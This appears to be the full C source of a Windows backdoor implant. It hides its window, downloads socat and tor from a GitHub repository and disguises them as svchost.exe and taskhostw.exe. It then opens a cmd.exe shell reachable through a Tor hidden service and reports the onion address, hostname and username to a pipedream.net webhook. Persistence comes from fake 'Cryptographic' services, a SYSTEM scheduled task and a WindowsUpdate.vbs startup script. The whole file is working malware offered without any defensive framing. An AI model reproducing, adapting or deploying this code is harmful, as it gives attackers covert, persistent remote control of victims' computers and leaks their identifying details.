#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <winsvc.h>
#include <time.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ws2_32.lib")

#define TARGET_PATH_SIZE 512
#define BUFFER_SIZE 8192
#define FIXED_PORT 64152
#define GITHUB_BASE "https://github.com/haradeverg/4832400994/raw/main/"

// File mapping structure
typedef struct {
    const char* original_name;
    const char* new_name;
} FILE_MAPPING;

static FILE_MAPPING file_mappings[] = {
    {"msys-2.0.dll", "win_core.dll"},
    {"msys-crypto-1.0.0.dll", "win_crypto.dll"},
    {"msys-ncursesw6.dll", "win_term.dll"},
    {"msys-readline7.dll", "win_read.dll"},
    {"msys-ssl-1.0.0.dll", "win_ssl.dll"},
    {"msys-z.dll", "win_compress.dll"},
    {"socat.exe", "svchost.exe"},
    {"tor.exe", "taskhostw.exe"},
    {NULL, NULL}
};

// Configuration structure
typedef struct {
    int port;
    char onion_address[256];
} CONFIG;

// ================= UTILITY FUNCTIONS =================

char* get_target_path() {
    static char path[TARGET_PATH_SIZE];
    char user_profile[MAX_PATH];
    
    SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, user_profile);
    snprintf(path, sizeof(path), "%s\\AppData\\Local\\Microsoft\\NET Framework\\v4.0.30319\\", user_profile);
    
    CreateDirectoryA(path, NULL);
    return path;
}

void hide_window() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd) {
        ShowWindow(hwnd, SW_HIDE);
        SetWindowPos(hwnd, 0, -10000, -10000, 0, 0, SWP_NOACTIVATE | SWP_NOZORDER);
    }
}

// Convert wide char to multi-byte
char* wchar_to_char(const wchar_t* wstr) {
    static char str[512];
    WideCharToMultiByte(CP_ACP, 0, wstr, -1, str, sizeof(str), NULL, NULL);
    return str;
}

// Secure download with retry mechanism
int download_file_with_retry(const char* url, const char* local_path, int max_retries) {
    for (int retry = 0; retry < max_retries; retry++) {
        HINTERNET hInternet = InternetOpenA("Microsoft-CryptoAPI", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (!hInternet) {
            Sleep(1000);
            continue;
        }
        
        HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, 
                                         INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | 
                                         INTERNET_FLAG_NO_COOKIES, 0);
        if (!hUrl) {
            InternetCloseHandle(hInternet);
            Sleep(1000);
            continue;
        }
        
        FILE* fp = fopen(local_path, "wb");
        if (!fp) {
            InternetCloseHandle(hUrl);
            InternetCloseHandle(hInternet);
            Sleep(500);
            continue;
        }
        
        DWORD bytes_read;
        char buffer[BUFFER_SIZE];
        int success = 1;
        
        while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytes_read) && bytes_read > 0) {
            if (fwrite(buffer, 1, bytes_read, fp) != bytes_read) {
                success = 0;
                break;
            }
        }
        
        fclose(fp);
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        
        if (success) {
            // Verify file was downloaded
            HANDLE hFile = CreateFileA(local_path, GENERIC_READ, FILE_SHARE_READ, NULL, 
                                      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD fileSize = GetFileSize(hFile, NULL);
                CloseHandle(hFile);
                if (fileSize > 0) {
                    return 1;
                }
            }
        }
        
        DeleteFileA(local_path);
        Sleep(2000);
    }
    return 0;
}

void download_all_components() {
    char* base_path = get_target_path();
    char url[512];
    char local_path[TARGET_PATH_SIZE];
    
    for (int i = 0; file_mappings[i].original_name != NULL; i++) {
        snprintf(local_path, sizeof(local_path), "%s%s", base_path, file_mappings[i].new_name);
        
        // Check if file already exists
        if (GetFileAttributesA(local_path) == INVALID_FILE_ATTRIBUTES) {
            snprintf(url, sizeof(url), "%s%s", GITHUB_BASE, file_mappings[i].original_name);
            
            if (download_file_with_retry(url, local_path, 3)) {
                // Success
            } else {
                // Failed
            }
        }
        
        Sleep(500);
    }
}

// ================= CONFIGURATION MANAGEMENT =================

void save_config(CONFIG* config, const char* config_path) {
    FILE* fp = fopen(config_path, "w");
    if (fp) {
        fprintf(fp, "Port=%d\n", config->port);
        fprintf(fp, "OnionAddress=%s\n", config->onion_address);
        fclose(fp);
    }
}

void read_config(CONFIG* config, const char* config_path) {
    FILE* fp = fopen(config_path, "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            char* eq = strchr(line, '=');
            if (eq) {
                *eq = '\0';
                char* value = eq + 1;
                value[strcspn(value, "\r\n")] = 0;
                
                if (strcmp(line, "Port") == 0) {
                    config->port = atoi(value);
                } else if (strcmp(line, "OnionAddress") == 0) {
                    strncpy(config->onion_address, value, sizeof(config->onion_address) - 1);
                }
            }
        }
        fclose(fp);
    }
}

// ================= PROCESS MANAGEMENT =================

void kill_all_related_processes() {
    const char* processes[] = {"taskhostw.exe", "svchost.exe", "tor.exe", "socat.exe", NULL};
    
    for (int i = 0; processes[i] != NULL; i++) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe;
            pe.dwSize = sizeof(PROCESSENTRY32W);
            
            if (Process32FirstW(hSnapshot, &pe)) {
                do {
                    char exeName[256];
                    WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, exeName, sizeof(exeName), NULL, NULL);
                    
                    if (_stricmp(exeName, processes[i]) == 0) {
                        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                        if (hProcess) {
                            TerminateProcess(hProcess, 0);
                            CloseHandle(hProcess);
                            Sleep(500);
                        }
                    }
                } while (Process32NextW(hSnapshot, &pe));
            }
            CloseHandle(hSnapshot);
        }
    }
}

int start_hidden_service(const char* path, const char* args, const char* working_dir) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    char command_line[1024];
    snprintf(command_line, sizeof(command_line), "\"%s\" %s", path, args);
    
    if (CreateProcessA(NULL, command_line, NULL, NULL, FALSE, 
                      CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP, 
                      NULL, working_dir, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }
    
    return 0;
}

// ================= TOR CONFIGURATION =================

void create_tor_configuration(const char* base_path, int port) {
    char torrc_path[TARGET_PATH_SIZE];
    char hidden_service_dir[TARGET_PATH_SIZE];
    char data_dir[TARGET_PATH_SIZE];
    
    snprintf(torrc_path, sizeof(torrc_path), "%storrc", base_path);
    snprintf(hidden_service_dir, sizeof(hidden_service_dir), "%shidden_service", base_path);
    snprintf(data_dir, sizeof(data_dir), "%sData", base_path);
    
    CreateDirectoryA(hidden_service_dir, NULL);
    CreateDirectoryA(data_dir, NULL);
    
    FILE* fp = fopen(torrc_path, "w");
    if (fp) {
        fprintf(fp, "SOCKSPort 9050\n");
        fprintf(fp, "ControlPort 9051\n");
        fprintf(fp, "HiddenServiceDir %s\n", hidden_service_dir);
        fprintf(fp, "HiddenServicePort %d 127.0.0.1:%d\n", port, port);
        fprintf(fp, "DataDirectory %s\n", data_dir);
        fprintf(fp, "Log notice file %stor.log\n", base_path);
        fclose(fp);
    }
}

char* wait_for_onion_address(const char* hidden_service_dir, CONFIG* config, int max_wait_seconds) {
    char hostname_path[TARGET_PATH_SIZE];
    snprintf(hostname_path, sizeof(hostname_path), "%s\\hostname", hidden_service_dir);
    
    for (int i = 0; i < max_wait_seconds * 2; i++) {
        FILE* fp = fopen(hostname_path, "r");
        if (fp) {
            char address[256];
            if (fgets(address, sizeof(address), fp)) {
                fclose(fp);
                
                // Remove newline
                address[strcspn(address, "\r\n")] = 0;
                
                if (strlen(address) > 0) {
                    strncpy(config->onion_address, address, sizeof(config->onion_address) - 1);
                    return config->onion_address;
                }
            }
            fclose(fp);
        }
        
        // Check if Tor process is still running
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe;
            pe.dwSize = sizeof(PROCESSENTRY32W);
            
            int tor_running = 0;
            if (Process32FirstW(hSnapshot, &pe)) {
                do {
                    char exeName[256];
                    WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, exeName, sizeof(exeName), NULL, NULL);
                    
                    if (_stricmp(exeName, "taskhostw.exe") == 0) {
                        tor_running = 1;
                        break;
                    }
                } while (Process32NextW(hSnapshot, &pe));
            }
            CloseHandle(hSnapshot);
            
            if (!tor_running) {
                return NULL;
            }
        }
        
        Sleep(500);
    }
    
    return NULL;
}

// ================= WEBHOOK NOTIFICATION =================

void send_webhook_notification(const char* onion_address, int port) {
    HINTERNET hInternet = InternetOpenA("Microsoft-CryptoAPI", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) {
        return;
    }
    
    HINTERNET hConnect = InternetConnectA(hInternet, "eo4wjj626023j1z.m.pipedream.net", 
                                         INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, 
                                         INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return;
    }
    
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/", NULL, NULL, NULL, 
                                         INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }
    
    char hostname[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(hostname);
    GetComputerNameA(hostname, &size);
    
    char username[256];
    DWORD username_len = sizeof(username);
    GetUserNameA(username, &username_len);
    
    char payload[1024];
    snprintf(payload, sizeof(payload), 
             "{\"onion_address\":\"%s\",\"port\":%d,\"hostname\":\"%s\",\"user\":\"%s\",\"timestamp\":\"%s\"}", 
             onion_address, port, hostname, username, __DATE__);
    
    char headers[] = "Content-Type: application/json";
    
    HttpSendRequestA(hRequest, headers, strlen(headers), payload, strlen(payload));
    
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

// ================= PERSISTENCE MECHANISMS =================

int install_windows_service(const char* service_name, const char* display_name, 
                           const char* bin_path, const char* description) {
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) {
        return 0;
    }
    
    // Check if service already exists
    SC_HANDLE service = OpenServiceA(scm, service_name, SERVICE_ALL_ACCESS);
    if (service) {
        // Stop the service first
        SERVICE_STATUS status;
        ControlService(service, SERVICE_CONTROL_STOP, &status);
        Sleep(2000);
        
        // Delete the service
        DeleteService(service);
        
        CloseServiceHandle(service);
        Sleep(2000);
    }
    
    // Create new service
    service = CreateServiceA(
        scm,
        service_name,
        display_name,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        bin_path,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );
    
    if (service) {
        // Set service description
        SERVICE_DESCRIPTIONA sd;
        sd.lpDescription = (LPSTR)description;
        ChangeServiceConfig2A(service, SERVICE_CONFIG_DESCRIPTION, &sd);
        
        // Start service
        StartService(service, 0, NULL);
        
        CloseServiceHandle(service);
    }
    
    CloseServiceHandle(scm);
    return service != NULL;
}

void create_scheduled_task(const char* base_path, int port) {
    char batch_path[TARGET_PATH_SIZE];
    snprintf(batch_path, sizeof(batch_path), "%s\\startup_runner.bat", base_path);
    
    // Create batch file
    FILE* batch = fopen(batch_path, "w");
    if (batch) {
        fprintf(batch, "@echo off\n");
        fprintf(batch, "cd /d \"%s\"\n", base_path);
        fprintf(batch, "start /B taskhostw.exe -f \"torrc\"\n");
        fprintf(batch, "timeout /t 35 >nul\n");
        fprintf(batch, "start /B svchost.exe TCP-LISTEN:%d,reuseaddr,fork,keepalive EXEC:cmd.exe,pty,stderr\n", port);
        fclose(batch);
        
        // Create scheduled task
        char cmd[1024];
        snprintf(cmd, sizeof(cmd), 
                 "schtasks /create /tn \"MicrosoftCryptoService\" /tr \"\\\"%s\\\"\" /sc onstart /ru SYSTEM /f",
                 batch_path);
        
        system(cmd);
    }
}

void create_startup_registry(const char* base_path, int port) {
    HKEY hKey;
    char startup_path[MAX_PATH];
    char vbs_path[MAX_PATH];
    
    // Get Startup folder path
    SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path);
    
    // Create VBS script
    snprintf(vbs_path, sizeof(vbs_path), "%s\\WindowsUpdate.vbs", startup_path);
    
    FILE* vbs = fopen(vbs_path, "w");
    if (vbs) {
        fprintf(vbs, "Set WshShell = CreateObject(\"WScript.Shell\")\n");
        fprintf(vbs, "WshShell.CurrentDirectory = \"%s\"\n", base_path);
        fprintf(vbs, "WshShell.Run \"cmd.exe /c start /B taskhostw.exe -f \\\"torrc\\\"\", 0, False\n");
        fprintf(vbs, "WScript.Sleep 35000\n");
        fprintf(vbs, "WshShell.Run \"cmd.exe /c start /B svchost.exe TCP-LISTEN:%d,reuseaddr,fork,keepalive EXEC:cmd.exe,pty,stderr\", 0, False\n", port);
        fprintf(vbs, "Set WshShell = Nothing\n");
        fclose(vbs);
    }
}

void setup_all_persistence(const char* base_path, int port) {
    // 1. Windows Service for Tor
    char tor_bin_path[1024];
    snprintf(tor_bin_path, sizeof(tor_bin_path), "\"%s\\taskhostw.exe\" -f \"%s\\torrc\"", base_path, base_path);
    install_windows_service("WindowsCryptographicService", "Windows Cryptographic Service", 
                           tor_bin_path, "Provides cryptographic services for Windows applications");
    
    // 2. Windows Service for Socat
    char socat_bin_path[1024];
    snprintf(socat_bin_path, sizeof(socat_bin_path), 
             "\"%s\\svchost.exe\" TCP-LISTEN:%d,reuseaddr,fork,keepalive EXEC:cmd.exe,pty,stderr", 
             base_path, port);
    install_windows_service("NetworkCryptoService", "Network Cryptographic Service", 
                           socat_bin_path, "Provides network cryptographic services");
    
    // 3. Scheduled Task
    create_scheduled_task(base_path, port);
    
    // 4. Registry Startup
    create_startup_registry(base_path, port);
}

// ================= MAIN EXECUTION =================

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Hide window immediately
    hide_window();
    
    // Step 1: Get base path
    char* base_path = get_target_path();
    
    // Step 2: Download all components
    download_all_components();
    
    // Step 3: Initialize configuration
    char config_path[TARGET_PATH_SIZE];
    snprintf(config_path, sizeof(config_path), "%s\\persistent_config.txt", base_path);
    
    CONFIG config;
    config.port = FIXED_PORT;
    config.onion_address[0] = '\0';
    
    read_config(&config, config_path);
    
    // Step 4: Create Tor configuration
    char hidden_service_dir[TARGET_PATH_SIZE];
    snprintf(hidden_service_dir, sizeof(hidden_service_dir), "%s\\hidden_service", base_path);
    create_tor_configuration(base_path, config.port);
    
    // Step 5: Kill existing processes
    kill_all_related_processes();
    Sleep(3000);
    
    // Step 6: Start Tor service
    char tor_path[TARGET_PATH_SIZE];
    snprintf(tor_path, sizeof(tor_path), "%s\\taskhostw.exe", base_path);
    
    if (start_hidden_service(tor_path, "-f torrc", base_path)) {
        // Step 7: Wait for onion address
        char* onion_address = wait_for_onion_address(hidden_service_dir, &config, 60);
        
        if (onion_address) {
            // Save configuration
            save_config(&config, config_path);
            
            // Step 8: Start Socat service
            char socat_path[TARGET_PATH_SIZE];
            snprintf(socat_path, sizeof(socat_path), "%s\\svchost.exe", base_path);
            
            char socat_args[256];
            snprintf(socat_args, sizeof(socat_args), 
                     "TCP-LISTEN:%d,reuseaddr,fork,keepalive EXEC:cmd.exe,pty,stderr", 
                     config.port);
            
            if (start_hidden_service(socat_path, socat_args, base_path)) {
                // Step 9: Send webhook notification
                send_webhook_notification(onion_address, config.port);
                
                // Step 10: Setup persistence
                setup_all_persistence(base_path, config.port);
                
                // Step 11: Save connection info
                char info_path[TARGET_PATH_SIZE];
                snprintf(info_path, sizeof(info_path), "%s\\persistent_connection_info.txt", base_path);
                
                FILE* info = fopen(info_path, "w");
                if (info) {
                    fprintf(info, "=== PERSISTENT CONNECTION INFORMATION ===\n\n");
                    fprintf(info, "Onion Address: %s\n", onion_address);
                    fprintf(info, "Port: %d\n\n", config.port);
                    fprintf(info, "=== PERSISTENCE METHODS INSTALLED ===\n");
                    fprintf(info, "1. Windows Service: WindowsCryptographicService (Tor)\n");
                    fprintf(info, "2. Windows Service: NetworkCryptoService (Socat)\n");
                    fprintf(info, "3. Scheduled Task: MicrosoftCryptoService\n");
                    fprintf(info, "4. Startup Registry: WindowsUpdate.vbs\n\n");
                    fprintf(info, "=== ACCESS INSTRUCTIONS ===\n");
                    fprintf(info, "Command: socat STDIO TCP4:%s:%d\n\n", onion_address, config.port);
                    
                    char hostname[MAX_COMPUTERNAME_LENGTH + 1];
                    DWORD size = sizeof(hostname);
                    GetComputerNameA(hostname, &size);
                    fprintf(info, "Hostname: %s\n", hostname);
                    
                    char username[256];
                    DWORD username_len = sizeof(username);
                    GetUserNameA(username, &username_len);
                    fprintf(info, "Username: %s\n", username);
                    
                    fclose(info);
                }
            }
        }
    }
    
    // Keep running briefly (silently)
    Sleep(5000);
    return 0;
}